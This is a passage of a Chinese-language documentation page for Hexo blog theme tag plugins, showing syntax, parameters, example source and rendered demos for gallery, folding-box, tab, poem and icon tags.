https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.100%宽度</p><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div>2.50%宽度<div class="videos" col='2'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div>3.25%宽度<div class="videos" col='4'><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div><div class="video"><video controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_0341.mov' type='video/mp4'>Your browser does not support the video tag.</video></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-19-相册-gallery">2.19 相册 gallery</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">markdown 圖片格式</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>gallerygroup 相册图库</li></ul><table><thead><tr><th>参数名</th><th>释义</th></tr></thead><tbody><tr><td>name</td><td>图库名字</td></tr><tr><td>description</td><td>图库描述</td></tr><tr><td>link</td><td>链接到对应相册的地址</td></tr><tr><td>img-url</td><td>图库封面</td></tr></tbody></table><ul><li><p>gallery 相册</p><p>区别于旧版的Gallery相册,新的Gallery相册会自动根据图片长度进行排版，书写也更加方便，与markdown格式一样。可根据需要插入到相应的md。无需再自己配置长宽。<strong>建议在粘贴时故意使用长短、大小、横竖不一的图片</strong>，会有更好的效果。（尺寸完全相同的图片只会平铺输出，效果很糟糕）</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span></span></span><br><span class="line">&#123;% galleryGroup MC 在Rikkaの六花服务器里留下的足迹 &#x27;/gallery/MC/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg %&#125;</span><br><span class="line">&#123;% galleryGroup Gundam 哦咧哇gundam哒！ &#x27;/gallery/Gundam/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png %&#125;</span><br><span class="line">&#123;% galleryGroup I-am-Akilar 某种意义上也算自拍吧 &#x27;/gallery/I-am-Akilar/&#x27; https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.gallery 相册</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.gallerygroup 相册图库</p><div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/1.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">MC</div>  <p>在Rikkaの六花服务器里留下的足迹</p>  <a href='/gallery/MC/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907110508327.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">Gundam</div>  <p>哦咧哇gundam哒！</p>  <a href='/gallery/Gundam/'></a>  </figcaption>  </figure>  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://cdn.cbd.int/akilar-candyassets@1.0.36/image/20200907113116651.png' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">I-am-Akilar</div>  <p>某种意义上也算自拍吧</p>  <a href='/gallery/I-am-Akilar/'></a>  </figcaption>  </figure></div>2.gallery 相册<div class="fj-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt=""><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt=""></p>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-20-折叠框-folding">2.20 折叠框 folding</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><p>1.gallerygroup 相册图库</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 参数（可选）, 标题 %&#125;</span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><!-- tab 参数配置 --><ol><li><p><code>颜色</code>：blue, cyan, green, yellow, red</p></li><li><p><code>状态</code>：状态填写 open 代表默认打开。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;% folding 查看图片测试 %&#125;</span><br><span class="line"></span><br><span class="line">![](<span class="link">https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg</span>)</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding cyan open, 查看默认打开的折叠框 %&#125;</span><br><span class="line"></span><br><span class="line">这是一个默认打开的折叠框。</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding green, 查看代码测试 %&#125;</span><br><span class="line">假装这里有代码块（代码块没法嵌套代码块）</span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding yellow, 查看列表测试 %&#125;</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> haha</span><br><span class="line"><span class="bullet">-</span> hehe</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding red, 查看嵌套测试 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding blue, 查看嵌套测试2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% folding 查看嵌套测试3 %&#125;</span><br><span class="line"></span><br><span class="line">hahaha <span class="language-xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;height:24px&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfolding %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><details class="folding-tag" ><summary> 查看图片测试 </summary>              <div class='content'>              <p><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg" alt=""></p>              </div>            </details><details class="folding-tag" cyan open><summary> 查看默认打开的折叠框 </summary>              <div class='content'>              <p>这是一个默认打开的折叠框。</p>              </div>            </details><details class="folding-tag" green><summary> 查看代码测试 </summary>              <div class='content'>              <p>假装这里有代码块（代码块没法嵌套代码块）</p>              </div>            </details><details class="folding-tag" yellow><summary> 查看列表测试 </summary>              <div class='content'>              <ul><li>haha</li><li>hehe</li></ul>              </div>            </details><details class="folding-tag" red><summary> 查看嵌套测试 </summary>              <div class='content'>              <details class="folding-tag" blue><summary> 查看嵌套测试2 </summary>              <div class='content'>              <details class="folding-tag" ><summary> 查看嵌套测试3 </summary>              <div class='content'>              <p>hahaha <span><img src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/tieba/%E6%BB%91%E7%A8%BD.png' style='height:24px'></span></p>              </div>            </details>              </div>            </details>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-21-分栏-tab">2.21 分栏 tab</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><p>Unique name :</p><ul><li><p>选项卡块标签的唯一名称，不带逗号。</p></li><li><p>将在#id中用作每个标签及其索引号的前缀。</p></li><li><p>如果名称中包含空格，则对于生成#id，所有空格将由破折号代替。</p></li><li><p>仅当前帖子/页面的URL必须是唯一的！</p></li></ul></li><li><p>[index]:</p><ul><li><p>活动选项卡的索引号。</p></li><li><p>如果未指定，将选择第一个标签（1）。</p></li><li><p>如果index为-1，则不会选择任何选项卡。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[Tab caption]:</p><ul><li><p>当前选项卡的标题。</p></li><li><p>如果未指定标题，则带有制表符索引后缀的唯一名称将用作制表符的标题。</p></li><li><p>如果未指定标题，但指定了图标，则标题将为空。</p></li><li><p>可选参数。</p></li></ul></li><li><p>[@icon]:</p><ul><li><p>FontAwesome图标名称（全名，看起来像“ fas fa-font”）</p></li><li><p>可以指定带空格或不带空格；</p></li><li><p>例如’Tab caption @icon’ 和 ‘Tab caption@icon’.</p></li><li><p>可选参数。</p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.Demo 1 - 预设选择第一个【默认】</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>2.Demo 2 - 预设选择tabs</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test2, 3 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>3.Demo 3 - 没有预设值</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test3, -1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line">&lt;!-- tab 第一个Tab --&gt;</span><br><span class="line"><span class="strong">**tab名字为第一个Tab**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line"><span class="strong">**只有图标 没有Tab名字**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 炸弹@fas fa-bomb --&gt;</span><br><span class="line"><span class="strong">**名字+icon**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.Demo 1 - 预设选择第一个【默认】</p><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>2.Demo 2 - 预设选择tabs</p><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test2-1">test2 1</button></li><li class="tab"><button type="button" data-href="#test2-2">test2 2</button></li><li class="tab active"><button type="button" data-href="#test2-3">test2 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test2-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="test2-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>3.Demo 3 - 没有预设值</p><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">test3 1</button></li><li class="tab"><button type="button" data-href="#test3-2">test3 2</button></li><li class="tab"><button type="button" data-href="#test3-3">test3 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>4.Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一个Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸弹</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab名字为第一个Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有图标 没有Tab名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-22-诗词标签-poem">2.22 诗词标签 poem</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><ol><li><code>title</code>：诗词标题</li><li><code>author</code>：作者，可以不写</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% poem 水调歌头,苏轼 %&#125;</span><br><span class="line">丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。</span><br><span class="line">明月几时有？把酒问青天。</span><br><span class="line">不知天上宫阙，今夕是何年？</span><br><span class="line">我欲乘风归去，又恐琼楼玉宇，高处不胜寒。</span><br><span class="line">起舞弄清影，何似在人间？</span><br><span class="line"></span><br><span class="line">转朱阁，低绮户，照无眠。</span><br><span class="line">不应有恨，何事长向别时圆？</span><br><span class="line">人有悲欢离合，月有阴晴圆缺，此事古难全。</span><br><span class="line">但愿人长久，千里共婵娟。</span><br><span class="line">&#123;% endpoem %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class='poem'><div class='poem-title'>水调歌头</div><div class='poem-author'>苏轼</div><p>丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。<br>明月几时有？把酒问青天。<br>不知天上宫阙，今夕是何年？<br>我欲乘风归去，又恐琼楼玉宇，高处不胜寒。<br>起舞弄清影，何似在人间？</p><p>转朱阁，低绮户，照无眠。<br>不应有恨，何事长向别时圆？<br>人有悲欢离合，月有阴晴圆缺，此事古难全。<br>但愿人长久，千里共婵娟。</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-23-阿里图标-icon">2.23 阿里图标 icon</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon [icon-xxxx],[font-size] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>icon-xxxx</code>：表示图标<code>font-class</code>,可以在自己的阿里矢量图标库项目的<code>font-class</code>引用方案内查询并复制。</li><li><code>font-size</code>：表示图标大小，直接填写数字即可，单位为<code>em</code>。图标大小默认值为<code>1em</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;% icon icon-rat<span class="emphasis">_zi %&#125;&#123;% icon icon-rat,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-ox_</span>chou,3 %&#125;&#123;% icon icon-ox,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-tiger<span class="emphasis">_yin,5 %&#125;&#123;% icon icon-tiger,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rabbit_</span>mao,1 %&#125;&#123;% icon icon-rabbit,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dragon<span class="emphasis">_chen,3 %&#125;&#123;% icon icon-dragon,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-snake_</span>si,5 %&#125;&#123;% icon icon-snake,6 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-horse<span class="emphasis">_wu %&#125;&#123;% icon icon-horse,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-goat_</span>wei,3 %&#125;&#123;% icon icon-goat,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-monkey<span class="emphasis">_shen,5 %&#125;&#123;% icon icon-monkey,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rooster_</span>you %&#125;&#123;% icon icon-rooster,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dog<span 